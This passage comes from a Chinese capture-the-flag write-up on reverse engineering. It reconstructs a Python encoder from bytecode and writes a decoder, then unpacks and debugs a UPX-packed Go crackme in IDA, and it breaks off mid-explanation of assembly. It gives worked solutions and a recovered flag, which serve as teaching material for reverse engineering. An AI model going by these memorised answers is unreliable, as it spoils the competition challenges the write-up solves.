STORE_FAST               4 (temp)\n\n 36 LOAD_FAST                2 (p)\n 38 LOAD_CONST               3 (2)\n 40 BINARY_MODULO\n 42 LOAD_CONST               4 (0)\n 44 COMPARE_OP               2 (==)\n 46 POP_JUMP_IF_FALSE       56\n\n 48 LOAD_FAST                4 (temp)\n 50 LOAD_CONST               5 (143)\n 52 INPLACE_ADD\n 54 STORE_FAST               4 (temp)\n\n 56 LOAD_FAST                1 (result)\n 58 LOAD_CONST               6 ('%02X')\n 60 LOAD_FAST                4 (temp)\n 62 BINARY_MODULO\n 64 INPLACE_ADD\n 66 STORE_FAST               1 (result)\n 68 JUMP_ABSOLUTE           12\n\n 70 LOAD_FAST                1 (result)\n 72 RETURN_VALUE\n\n```\n\n首先定义了一个encode函数。\n\n0-18行，先是定义了result空变量，然后进行了一个for循环，取了**enumerate(string)**的值，赋值给了p和i\n\n20-34行，将ord(i)与168异或再与p异或，赋值给**temp**\n\n```python\ndef encode():\n\tresult = ''\n\tfor p,i in enumerate(string):\n    \ttemp = ord(i) ^ 168 ^ p\n```\n\n36-46行，注意第40行 **BINARY_MODULO** 这里是 % 取模的意思，然后第46行是一个if判断，判断的条件是p % 2 == 0 如果不满足跳转至56行。\n\n48-54行，满足条件的结果：将temp 加上 143 又赋值给temp，这个操作相当于**temp += 143**。\n\n56-68行，不满足条件的结果：62行的 **BINARY_MODULO** 代表着 **%** ，即**\"%02X\" % temp**，然后赋值给result。注意64行的 **INPLACE_ADD** ，这里的add说明了result也是自加。这段代码相当于 **result += \"%02X\"%temp**。最后**JUMP_ABSOLUTE 12** 意味着进入下一次循环，代码中for循环的结束。\n\n70-72行，返回result的值。\n\n#### 调试\n\n当我们不明白某个字节码的意思时，可以自己打个草稿，用python的**dis**模块可以生成字节码，根据猜测字节码的意思来输入对应的代码，然后用生成的字节码来看看是否对应相等。\n\n如下：\n\n```python\nimport dis\n\ndef test():\n    result += \"%02X\"%123\n    \ndis.dis(test)\n```\n\n运行得到字节码\n\n```python\n  4           0 LOAD_FAST                0 (result)\n              2 LOAD_CONST               1 ('%02X')\n              4 LOAD_CONST               2 (123)\n              6 BINARY_MODULO\n              8 INPLACE_ADD\n             10 STORE_FAST               0 (result)\n             12 LOAD_CONST               0 (None)\n             14 RETURN_VALUE\n```\n\n这样我们就可以通过比对字节码来修改自己的代码，更全面地还原源代码。\n\n#### 完整加密代码\n\n```python\ndef encode():\n    result = ''\n    for p,i in enumerate(string):\n        temp = ord(i) ^ 168 ^ p\n        if p%2 == 0:\n            temp += 143\n        result += \"%02X\"%temp\n    return result\n```\n\nPython解密代码\n\n我们得到的密文为：\n\n```\n15DC515ACC166DD166FB1579115BFF154F615ADA\n```\n\n根据完整加密代码可以得知，result值为hex值，我们只要取每段密文的hex值 根据密文对应的索引进行不同的处理，然后异或索引和168就可以还原明文。\n\n这里有一个地方需要注意：\n\n**%02X 代表的并不是 长度为2的hex，而是至少长度为2的hex**。所以我们处理密文的时候不能每2位去取，密文也可以是3位\n\n```python\ndef decode():\n    result = []\n    cipher = \"15DC515ACC166DD166FB1579115BFF154F615ADA\"\n    n = 0\n    start = 0\n    while 1:\n        if n %2 == 0:\n            hexdata = cipher[start:start+3]\n            data = (int(hexdata,16)  - 143) ^ 168 ^ n\n            result += chr(data)\n            print(n,hexdata,chr(data))\n            start += 3\n        else:\n            hexdata = cipher[start:start+2]\n            data = int(hexdata,16) ^ 168 ^ n\n            result += chr(data)\n            print(n,hexdata,chr(data))\n            start += 2\n        n += 1\n        if start == len(cipher):\n            break\n    print(''.join(result))\n\ndecode()\n```\n\n这边脚本的思路就是当索引为偶数时，temp会加上143，因此导致数值很大，hex可以达到3位。\n\n以这个特征做判断，取下标对应的字符串 然后解密。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/Unni4gu4873MIkTs1710404958.png)\n\n#### FLAG\n\n```\nflag{pyTh0n\\aSm}\n```\n\n\n\n### *江苏re2-easygo.exe（golang逆向）\n\n#### UPX脱壳\n\n分析exe文件，发现带有UPX壳\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/CU14DhIcmicvnLPR1710404958.png)\n\n用upx unpack脱壳\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8ggsYLtD3CA4S9BO1710404958.png)\n\n#### 代码运行逻辑\n\n此时我们再去分析，函数都正常加载了（由于是golang语言，使用IDA7.5以上的版本可以直接解析函数名比较方便）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/G61IVqHocwePtMWp1710404958.png)\n\n跟进main函数，此时进行分析。\n\n这里由于IDA的调试问题，**IDA7.6对代码的分析更加清晰，但我的这个版本进行调试会报错，IDA7.5对代码的分析比较难看懂，但是能调试**。所以这里我选择两个版本同时进行分析、调试。\n\n```c++\nvoid __cdecl main_main()\n{\n  __int64 i; // rcx\n  __int64 j; // rcx\n  __int64 k; // rcx\n  __int64 m; // rcx\n  __int64 *v4; // rax\n  __int64 v5; // rcx\n  __int64 v6; // r8\n  char v7; // bl\n  __int64 n; // rcx\n  __int64 v9; // [rsp+0h] [rbp-200h]\n  __int64 v10; // [rsp+8h] [rbp-1F8h]\n  __int64 v11; // [rsp+8h] [rbp-1F8h]\n  __int64 v12; // [rsp+8h] [rbp-1F8h]\n  __int64 v13; // [rsp+8h] [rbp-1F8h]\n  char *v14; // [rsp+8h] [rbp-1F8h]\n  char *v15; // [rsp+8h] [rbp-1F8h]\n  __int64 *v16; // [rsp+8h] [rbp-1F8h]\n  __int64 v17; // [rsp+10h] [rbp-1F0h]\n  __int64 v18; // [rsp+10h] [rbp-1F0h]\n  __int64 v19; // [rsp+18h] [rbp-1E8h]\n  __int64 v20; // [rsp+18h] [rbp-1E8h]\n  __int64 v21; // [rsp+18h] [rbp-1E8h]\n  __int64 v22; // [rsp+18h] [rbp-1E8h]\n  __int64 v23; // [rsp+18h] [rbp-1E8h]\n  __int64 v24; // [rsp+18h] [rbp-1E8h]\n  __int64 v25; // [rsp+18h] [rbp-1E8h]\n  __int64 v26; // [rsp+18h] [rbp-1E8h]\n  __int128 v27; // [rsp+20h] [rbp-1E0h]\n  __int64 v28; // [rsp+20h] [rbp-1E0h]\n  __int128 v29; // [rsp+20h] [rbp-1E0h]\n  __int64 v30; // [rsp+20h] [rbp-1E0h]\n  __int64 v31; // [rsp+20h] [rbp-1E0h]\n  __int64 v32; // [rsp+20h] [rbp-1E0h]\n  __int64 v33; // [rsp+20h] [rbp-1E0h]\n  __int64 v34; // [rsp+28h] [rbp-1D8h]\n  __int64 v35; // [rsp+28h] [rbp-1D8h]\n  __int64 v36; // [rsp+28h] [rbp-1D8h]\n  __int64 v37; // [rsp+28h] [rbp-1D8h]\n  __int64 v38; // [rsp+28h] [rbp-1D8h]\n  __int16 v39; // [rsp+55h] [rbp-1ABh] BYREF\n  char v40; // [rsp+57h] [rbp-1A9h]\n  __int64 v41; // [rsp+58h] [rbp-1A8h]\n  __int64 v42; // [rsp+60h] [rbp-1A0h]\n  __int64 v43; // [rsp+68h] [rbp-198h]\n  __int64 v44; // [rsp+70h] [rbp-190h]\n  __int64 v45; // [rsp+78h] [rbp-188h]\n  __int64 v46; // [rsp+80h] [rbp-180h] BYREF\n  _QWORD v47[2]; // [rsp+8Bh] [rbp-175h] BYREF\n  char v48[37]; // [rsp+9Bh] [rbp-165h] BYREF\n  char v49[32]; // [rsp+C0h] [rbp-140h] BYREF\n  char v50[32]; // [rsp+E0h] [rbp-120h] BYREF\n  char v51[32]; // [rsp+100h] [rbp-100h] BYREF\n  char v52[32]; // [rsp+120h] [rbp-E0h] BYREF\n  __int64 v53; // [rsp+140h] [rbp-C0h]\n  __int64 v54; // [rsp+148h] [rbp-B8h]\n  __int64 v55; // [rsp+150h] [rbp-B0h]\n  __int64 v56; // [rsp+158h] [rbp-A8h]\n  __int64 v57; // [rsp+160h] [rbp-A0h]\n  char *v58; // [rsp+168h] [rbp-98h]\n  char *v59; // [rsp+170h] [rbp-90h]\n  __int64 v60; // [rsp+178h] [rbp-88h]\n  __int64 *v61; // [rsp+180h] [rbp-80h]\n  _QWORD v62[2]; // [rsp+188h] [rbp-78h] BYREF\n  _QWORD v63[2]; // [rsp+198h] [rbp-68h] BYREF\n  _QWORD v64[2]; // [rsp+1A8h] [rbp-58h] BYREF\n  _QWORD v65[2]; // [rsp+1B8h] [rbp-48h] BYREF\n  _QWORD v66[2]; // [rsp+1C8h] [rbp-38h] BYREF\n  _QWORD v67[2]; // [rsp+1D8h] [rbp-28h] BYREF\n  _QWORD v68[2]; // [rsp+1E8h] [rbp-18h] BYREF\n\n  while ( (unsigned __int64)&v46 <= *(_QWORD *)(*(_QWORD *)NtCurrentTeb()->NtTib.ArbitraryUserPointer + 16LL) )\nLABEL_33:\n    runtime_morestack_noctxt();\n  runtime_newobject((__int64)&unk_4BB5C0, v10);\n  v61 = (__int64 *)v11;\n  runtime_newobject((__int64)&unk_4BC200, v11);\n  *(_QWORD *)v12 = 0xA1AFE4B0B1B4AA8DLL;\n  *(_DWORD *)(v12 + 8) = 15007421;\n  for ( i = 0LL; i < 11; ++i )\n    *(_BYTE *)(v12 + i) = *(_BYTE *)(i + v12) ^ 0xC4;\n  v40 = 0;\n  v39 = -9078;\n  for ( j = 0LL; j < 2; ++j )\n    *((_BYTE *)&v39 + j) ^= 0xAFu;\n  v60 = v12;\n  runtime_slicebytetostring((__int64)v49, (__int64)&v39, 3LL, 3, v27);\n  v45 = v34;\n  v56 = v28;\n  runtime_convTslice(v60, 12LL, 12LL, v19);\n  v64[0] = &unk_4BA200;\n  v64[1] = v20;\n  *((_QWORD *)&v29 + 1) = fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v56, v45, v64);\n  v63[0] = &unk_4B8620;\n  v63[1] = v61;\n  *(_QWORD *)&v29 = fmt_Fscanln(&go_itab__os_File_io_Reader, os_Stdin, v63, 1LL);\n  v13 = main_CalcGOffset(*v61);\n  runtime_newobject((__int64)&unk_4BC5C0, v13);\n  strcpy(v14, \"Dc}xy-kalj7-\");\n  for ( k = 0LL; k < 12; ++k )\n    v14[k] ^= 0xD;\n  v59 = v14;\n  runtime_newobject((__int64)&unk_4BF260, (__int64)v14);\n  strcpy(v15, \"lkcf\");\n  for ( m = 0LL; m < 4; ++m )\n    v15[m] ^= 0xA;\n  v58 = v15;\n  runtime_newobject((__int64)&unk_4BB5C0, (__int64)v15);\n  v61 = v16;\n  runtime_slicebytetostring((__int64)&v48[5], (__int64)&v39, 3LL, 3, v29);\n  v42 = v35;\n  v53 = v30;\n  runtime_convTslice((__int64)v59, 13LL, 13LL, v21);\n  v62[0] = &unk_4BA200;\n  v62[1] = v22;\n  *((_QWORD *)&v27 + 1) = fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v53, v42, v62);\n  v68[0] = &unk_4B8620;\n  v68[1] = v61;\n  *(_QWORD *)&v27 = fmt_Fscanln(&go_itab__os_File_io_Reader, os_Stdin, v68, 1LL);\n  v4 = v61;\n  if ( qword_58EDD8 == v61[1] )\n  {\n    v5 = 0LL;\n    while ( v4[1] > v5 )\n    {\n      if ( !qword_58EDD8 )\n      {\n        runtime_panicdivide();\n        goto LABEL_33;\n      }\n      v6 = *v4;\n      if ( v5 % qword_58EDD8 >= (unsigned __int64)qword_58EDD8 )\n        goto LABEL_31;\n      v7 = (v5 % qword_58EDD8) ^ *((_BYTE *)main_G_flag + v5 % qword_58EDD8);\n      if ( !qword_58EDF8 )\n      {\n        runtime_panicdivide();\nLABEL_31:\n        runtime_panicIndex(v9, v10);\n      }\n      if ( v5 % qword_58EDF8 >= (unsigned __int64)qword_58EDF8 )\n        runtime_panicIndex(v9, v10);\n      v41 = v5;\n      LOBYTE(v9) = *(_BYTE *)(v5 + v6);\n      BYTE1(v9) = (v5 % qword_58EDF8) ^ *((_BYTE *)main_key + v5 % qword_58EDF8);\n      main_getCryptOne();\n      if ( (_BYTE)v10 != v7 )\n      {\n        runtime_slicebytetostring((__int64)v51, (__int64)&v39, 3LL, 3, v27);\n        v55 = v31;\n        v43 = v36;\n        runtime_convTslice((__int64)v58, 5LL, 5LL, v23);\n        v66[0] = &unk_4BA200;\n        v66[1] = v24;\n        fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v55, v43, v66);\n        return;\n      }\n      v5 = v41 + 1;\n      v4 = v61;\n    }\n    v47[0] = 0x414B0D59454A447FLL;\n    v47[1] = 0x4A4C414B0D174A4CLL;\n    strcpy(v48, \"V\\b^P\");\n    for ( n = 0LL; n < 20; ++n )\n      *((_BYTE *)v47 + n) ^= 0x2Du;\n    runtime_slicebytetostring((__int64)v50, (__int64)v47, 21LL, 21, v27);\n    v57 = v32;\n    v44 = v37;\n    runtime_convTstring(*v61, v61[1], v17);\n    v65[0] = &unk_4BB5C0;\n    v65[1] = v18;\n    fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v57, v44, v65);\n  }\n  else\n  {\n    runtime_slicebytetostring((__int64)v52, (__int64)&v39, 3LL, 3, v27);\n    v46 = v38;\n    v54 = v33;\n    runtime_convTslice((__int64)v58, 5LL, 5LL, v25);\n    v67[0] = &unk_4BA200;\n    v67[1] = v26;\n    fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v54, v46, v67);\n  }\n}\n```\n\n**像golang这种，一般runtime之类的函数我们可以不用去详细去分析，对整体代码不会有太大影响。**\n\n前面的部分就是要求我们输入key和flag\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/8LwHApFNKlwPXa9d1710404959.png)\n\n代码中赋值str并异或的部分就是对字符串进行异或解密，就是我们运行程序所看到的字符串。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/GepbWFpAAy7jMjc31710404959.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OStQ1Vxu3vBvCFOK1710404959.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/4z8yLskrJbxIude41710404959.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/6tpmouFcuacaYzoT1710404959.png)\n\n\n\n##### main_CalcGoffset计算偏移\n\n代码中间部分引用了一个**main_CalcGoffset**函数，起初我认为这并不是一个重要的函数，但到后面发现这是非常重要的一个函数。\n\n这个函数要求传参的v61，就是我们input key:处所输入的内容。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LEYPNYuMkYPgYvd61710404959.png)\n\n跟进分析：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/x4UylUbyLw6DDwJY1710404960.png)\n\n这里重要的是这个红框处**main_G_offset**的变量，它是一个全局变量，是后续加密函数中的必要参数。\n\n这里**qword_58EE18 = 0x3A(58)** \n\n![](http://cdn.anyiblog.top/WriteUp/20240314/aN7fVRz1SHszMFjl1710404960.png)\n\n要得到**main_G_offset **变量  **其内容就是 v5 与 qword_58EE18取模** \n\n所以关键是获取v5的值，由划线部分能得知v5为每次循环中v6的ascii码相加的结果**，这里v6又等于(v3 + v4)相当于v4[v3]**，在上面的变量定义中能得知 v3 = a1 ，v4每次都会+1\n\n所以简单来说，**v5就是遍历a1字符串，将字符串ascii码相加的结果，最后与0x3A取模得到偏移main_G_offset**。\n\n\n\n##### if判断\n\n最后会用fmt_FscanIn函数来获取输入的字符串，这里v68是字符串，又赋值给了v61和v4\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/jfZP5iuYQZeVxVJR1710404960.png)\n\n因此，这里v64[1]对应的是input flag:输入的内容，这里qword_58EDD8跟进是10h 也就是16，也就是说这里要求flag长度为16才能进入到加密的部分。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/L0KxkM0QkB1hFP7W1710404960.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/zHGYEx7JKjvTN4mB1710404960.png)\n\n如果不满足条件则退出程序，这里的v58在上面被v15赋值了，v15就是我们解密得到的fail字符串\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/i6NHAMBV582Y6AVz1710404961.png)\n\n至此，我们可以知道程序**要求用户输入一个key和长度为16的flag**，其中**key用来获取偏移main_G_offset的值 范围为0-57**，如果**flag长度不符合则退出程序**。\n\n\n\n#### 加密部分函数分析\n\n```c++\nif ( qword_58EDD8 == v61[1] )\n  {\n    v5 = 0LL;\n    while ( v4[1] > v5 )\n    {\n      if ( !qword_58EDD8 )\n      {\n        runtime_panicdivide();\n        goto LABEL_33;\n      }\n      v6 = *v4;\n      if ( v5 % qword_58EDD8 >= (unsigned __int64)qword_58EDD8 )\n        goto LABEL_31;\n      v7 = (v5 % qword_58EDD8) ^ *((_BYTE *)main_G_flag + v5 % qword_58EDD8);\n      if ( !qword_58EDF8 )\n      {\n        runtime_panicdivide();\nLABEL_31:\n        runtime_panicIndex(v9, v10);\n      }\n      if ( v5 % qword_58EDF8 >= (unsigned __int64)qword_58EDF8 )\n        runtime_panicIndex(v9, v10);\n      v41 = v5;\n      LOBYTE(v9) = *(_BYTE *)(v5 + v6);\n      BYTE1(v9) = (v5 % qword_58EDF8) ^ *((_BYTE *)main_key + v5 % qword_58EDF8);\n      main_getCryptOne();\n      if ( (_BYTE)v10 != v7 )\n      {\n        runtime_slicebytetostring((__int64)v51, (__int64)&v39, 3LL, 3, v27);\n        v55 = v31;\n        v43 = v36;\n        runtime_convTslice((__int64)v58, 5LL, 5LL, v23);\n        v66[0] = &unk_4BA200;\n        v66[1] = v24;\n        fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v55, v43, v66);\n        return;\n      }\n      v5 = v41 + 1;\n      v4 = v61;\n    }\n    v47[0] = 0x414B0D59454A447FLL;\n    v47[1] = 0x4A4C414B0D174A4CLL;\n    strcpy(v48, \"V\\b^P\");\n    for ( n = 0LL; n < 20; ++n )\n      *((_BYTE *)v47 + n) ^= 0x2Du;\n    runtime_slicebytetostring((__int64)v50, (__int64)v47, 21LL, 21, v27);\n    v57 = v32;\n    v44 = v37;\n    runtime_convTstring(*v61, v61[1], v17);\n    v65[0] = &unk_4BB5C0;\n    v65[1] = v18;\n    fmt_Fprintf(&go_itab__os_File_io_Writer, os_Stdout, v57, v44, v65);\n  }\n```\n\n常量如下：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/beYi3ABDMvJgCQ7N1710404961.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LBTF5ktNxSQNhAIO1710404961.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/LwphzJafxZB4LYcH1710404961.png)\n\n```c++\nqword_58EDD8 = 10h(16)\nqword_58EDF8 = 0Ch(12)\n\nmain_flag = [113, 161, 150, 97, 148, 103, 116, 121, 96, 134, 142, 102, 173, 135, 137, 81]\nmain_key = [171, 182, 148, 143, 164, 147, 170, 167, 145, 154, 180, 147, 0, 0, 0, 0, 0, 68, 1, 0, 70, 70, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/QaUT7lY8k12Z6mRE1710404961.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/5yebjd87JHpGigKd1710404961.png)\n\nflag长度等于16时，满足条件进行加密。\n\n首先，是一个while循环，这里v4[1]就是我们输入的flag，v5为0。其实可以总结为进行字符串遍历。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/MjWRfxTA4lt47xA81710404962.png)\n\n带有runtime的代码都可以忽略不计。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/ZNLhSt5aaoWoHvrn1710404962.png)\n\n这里v6取flag的内容\n\nv7是 v5%16 ^ main_flag的第v5%16个元素 用python表示为：\n\n```python\nv7 = (v5 % qword_58EDD8) ^ main_flag[v5 % qword_58EDD8]\n```\n\n这里的v9是分别低地址和高地址赋值，\n\n其中低地址的内容为v6[v5]，也就是v6的第xxx个字符\n\n高地址内容为 v5%12 ^ main_key的第v5%12个元素 用python表示为：\n\n```python\nv9[1] = v6[v5]\nv9[0] = (v5 % qword_58EDF8) ^ main_key[v5 % qword_58EDF8]\n```\n\n最后，进行了一个**main_getCryptOne()**函数的加密 会得到一个v10\n\nv10会与v7（输入的内容）比较 相同则满足条件。\n\n会逐一字符串检测，直至长度为16时，若有一个字符串不符合则会return返回\n\n当满足条件时代码会运行这部分：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/xuKiSgqs0CMHBI8t1710404962.png)\n\n​\t这里对v47进行异或，我们还原得到\n\n``````\nright flag: flag{%s}\n``````\n\n字符串。所以当字符串都满足条件时flag就是输入的内容。最后打印出来\n\n ![](http://cdn.anyiblog.top/WriteUp/20240314/Gq7vB8zQELdS5dbH1710404962.png)\n\n##### main_getCryptOne加密函数\n\n```c++\n__int16 __usercall main_getCryptOne@<ax>(__int64 a1, __int64 a2)\n{\n  __int64 v2; // rax\n  unsigned __int64 v3; // rdx\n  unsigned __int8 v4; // si\n  unsigned __int8 v5; // di\n\n  if ( !qword_58EE18 )\n  {\n    runtime_panicdivide();\n    LOWORD(v2) = sub_4AC491(a1, a2);\n    return v2;\n  }\n  if ( (unsigned __int8)(main_G_offset + a1 - 65) % qword_58EE18 >= (unsigned __int64)qword_58EE18 )\n    runtime_panicIndex();\n  v2 = (qword_58EE18 - 1) / qword_58EE18;\n  v3 = (qword_58EE18 - 1) % qword_58EE18;\n  v4 = BYTE1(a1)\n     + (((unsigned __int8)(main_G_offset + a1 - 65) % qword_58EE18) ^ *((_BYTE *)main_keyTable\n                                                                      + (unsigned __int8)(main_G_offset + a1 - 65)\n                                                                      % qword_58EE18))\n     - 65;\n  if ( v3 >= qword_58EE18 )\n    runtime_panicIndex();\n  v5 = v3 ^ *((_BYTE *)main_keyTable + v3);\n  if ( v4 > v5 )\n  {\n    if ( 0 % qword_58EE18 < (unsigned __int64)qword_58EE18 )\n    {\n      if ( v5 )\n      {\n        LOWORD(v2) = v4 / v5;\n        return v2;\n      }\n      runtime_panicdivide();\n    }\n    runtime_panicIndex();\n  }\n  return v2;\n}\n```\n\n\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/eO9k1sgdGGnKR5iP1710404962.png)\n\n常量如下：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/dhOsAstnwRv1E9CQ1710404963.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/VuKiDxVpKrODgRD51710404963.png)\n\n```c++\nqword_58EE18 = 3Ah(58)\n\nkeyTable = [65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 127, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 65, 71, 65, 67, 65, 95, 65, 67, 65, 71, 65, 67, 65, 79, 65, 67, 0, 0, 0, 0, 0, 0, 0, 8, 1, 0, 5, 8, 1, 0, 1, 0, 0, 0, 8, 8, 1, 0, 10, 8, 1, 0, 2, 0, 0, 0, 11, 8, 1, 0, 53, 8, 1, 0, 1, 0, 0, 0, 55, 8, 1, 0, 56, 8, 1, 0, 1, 0, 0, 0, 60, 8, 1, 0, 63, 8, 1, 0, 3, 0, 0, 0, 0, 0, 0, 0, 0, 188, 1, 0, 106, 188, 1, 0, 1, 0, 0, 0, 112, 188, 1, 0, 124, 188, 1, 0, 1, 0, 0, 0, 128, 188, 1, 0, 136, 188, 1, 0, 1, 0, 0, 0, 144, 188, 1, 0, 153, 188, 1, 0, 1, 0, 0, 0, 156, 188, 1, 0, 159, 188, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 224, 1, 0, 6, 224, 1, 0, 1, 0, 0, 0, 8, 224, 1, 0, 24, 224, 1, 0, 1, 0, 0, 0, 27, 224, 1, 0, 33, 224, 1, 0, 1, 0, 0, 0, 35, 224, 1, 0, 36, 224, 1, 0, 1, 0, 0, 0, 38, 224, 1, 0, 42, 224, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0]\n```\n\n要求传入a1，程序传入了带有低地址和高地址的v9\n\n先是计算v2和v3，由于qword_58EE18我们已知为0x3A，所以这两个变量算是常量。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/azvoKO2PAPXB0fpp1710404963.png)\n\n```python\nv2 = (58 - 1) // 58 (0)\nv3 = (58 - 1) % 58 (57)\n```\n\n计算v4 这边反编译小问题，完整的代码是这样的：\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/yKVbxv5SrVlONZJN1710404963.png)\n\n```c++\nv4 = HIBYTE(a1) + ((main_G_offset + a1 - 65) % qword_58EE18) ^ (main_keyTable + ((main_G_offset + a1 - 65) % qword_58EE18)) - 65\n```\n\n**HIBYTE(a1)取a1的高地址处的内容，后面的a1没声明取得是低地址的内容**。高地址为main_key表的内容，低地址则是用户输入的东西\n\n因为前面运行了main_CalcGoffset，赋值了全局变量main_G_offset 所以这里main_G_offset就是前面运行的结果。\n\n再异或相加相减得到了v4，具体的值需要我们带入输入值。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/A14nByBci2RNGtlU1710404963.png)\n\n```c++\nv5 = v3 ^ *((_BYTE *)main_keyTable + v3); (122)\n```\n\n这里因为v3是常量57，所以v5也是常量，计算下可以得到为122\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/J4KzRqSJitvN4HFc1710404963.png)\n\n最后是一个判断，如果v4>v5，返回v2 v2为v4/v5（1），反则返回0（常量0）\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/bLmQizqo1x1vROzx1710404964.png)\n\n```c++\nif (v4 > v5)\n{\n\tLOWORD(v2) = v4 / v5;\n\treturn v2;\n}\nreturn v2;\n```\n\n这里是返回布尔值，但我们能发现判断是v10和v7进行比较，计算后返回值也没有一个变量去接收，因此v10是什么我们还不清楚。\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/SqWvI9VsEe9nAbZQ1710404964.png)\n\n这种差异其实是因为没有对汇编完全翻译成功，我们看到的伪代码缺少逻辑性，所以要找到v10还需要我们去结合阅读和调试来看汇编的寄存器传参。\n\n##### IDA调试代码\n\n这里调试我使用的是IDA7.5，由于版本的不同所以变量解析不一样。\n\n其实调试才是读懂代码的关键，像上面的大多变量我们都是未知的，但是通过调试就能发现很多变量的内容以及程序的运行逻辑。\n\nIDA调试中可以通过单步调试（F7）和断点方便我们观察\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/qW7PTZiP4f4fztSm1710404964.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/0HPFB5gC1iehQG181710404964.png)\n\n接下来，我将记录我的调试操作、发现v10的过程\n\n###### 调试过程\n\n输入：\n\n```\nInput key: I\nInput flag: flagflagflagflag\n```\n\n首先运行到**main_CalcGoffset**处时，如果我们代码读懂了可以知道**main_G_offset = 73(I) % 58 = 0xf**\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/vd5kWmGk82sWzdfv1710404964.png)\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/wIWiOmrdx1QPiB9A1710404965.png)\n\n验证正确。\n\n运行到高低地址变量时，能发现低地址为0x66(输入的'f') 高地址为0xAB(main_key[0])\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/OGI8sPKzRozjPFM61710404965.png)\n\n跟进main_getCryptOne函数\n\n```python\nv11 = HIBYTE(a1) + ((main_G_offset + a1 - 65) % qword_58EE18) ^ (main_keyTable + ((main_G_offset + a1 - 65) % qword_58EE18)) - 65\nv11 = 0xAB + ((0xf+0x66-65) % 58) ^ (main_keyTable[(0xf+0x66-65) % 58]) - 65 = 223 (0xDF)\n```\n\n运行v11时，发现为0xDF\n\n![](http://cdn.anyiblog.top/WriteUp/20240314/r8lxsazxmTb1QGNN1710404965.png)\n\n验证成功。\n\n###### 寄存器解读\n\n当一直单步调试到if判断时，会显示汇编。这一部分是关键内容：\n![](http://cdn.anyiblog.top/WriteUp/20240314/iRtCWxPjd07no9HC1710404965.png)\n\n```\n.text:00000000004AC440                 xor     eax, eax\n.text:00000000004AC442                 cqo\n.text:00000000004AC444                 idiv    rcx\n.text:00000000004AC447                 cmp     rdx, rcx\n.text:00000000004AC44A                 jnb     short loc_4AC473\n.text:00000000004AC44C                 movzx   ecx, byte ptr [rbx+rdx]\n.text:00000000004AC450                 xor     ecx, edx\n.text:00000000004AC452                 test    dil, dil\n.text:00000000004AC455                 jz      short loc_4AC46E\n.text:00000000004AC457                 movzx   edx, dil\n.text:00000000004AC45B                 movzx   eax, sil\n.text:00000000004AC45F                 mov     ebx, edx\n.text:00000000004AC461                 xor     edx, edx\n.text:00000000004AC463                 div     bx\n.text:00000000004AC466                 lea     esi, [rdx+rcx]\n.text:00000000004AC469                 lea     esi, [rsi-1]\n.text:00000000004AC46C                 jmp     short loc_4AC431\n```\n\n汇编的解读：\n\n```\n这段代码是x86-64汇编语言代码，它是一些指令的集合。每条指令都用16进制表示，并在前面加上一个“.text:”前缀，表示代码段中的地址。以下是每条指令的简要说明：\n\nxor eax, eax：将eax寄存器中的值与自己进行异或运算，将结果存回eax寄存器中。这通常用于将寄存器中的值清零。\ncqo：将rax寄存器中的有符号整数扩展到rdx:rax寄存器对中，以便进行64位除法运算。\nidiv rcx：将rdx:rax寄存器对中的有符号整数除以rcx寄存器中的有符号整数。商存储在rax寄存器中，余数存储在rdx寄存器中。\ncmp rdx, rcx：将rdx寄存器中的值与rcx寄存器中的值进行比较。\njnb short loc_4AC473：如果rdx的值大于或等于rcx的值，则跳转到loc_4AC473处执行代码。\nmovzx ecx, byte ptr [rbx+rdx]：将rbx寄存器加上rdx的值作为地址，读取该地址上的一个字节并将其零扩展到ecx寄存器中。\nxor ecx, edx：将ecx寄存器中的值与edx寄存器中的值进行异或运算，并将结果存回ecx寄存器中。\ntest dil, dil：对dil寄存器的值进行位测试，结果不保存，仅设置标志位。\njz short 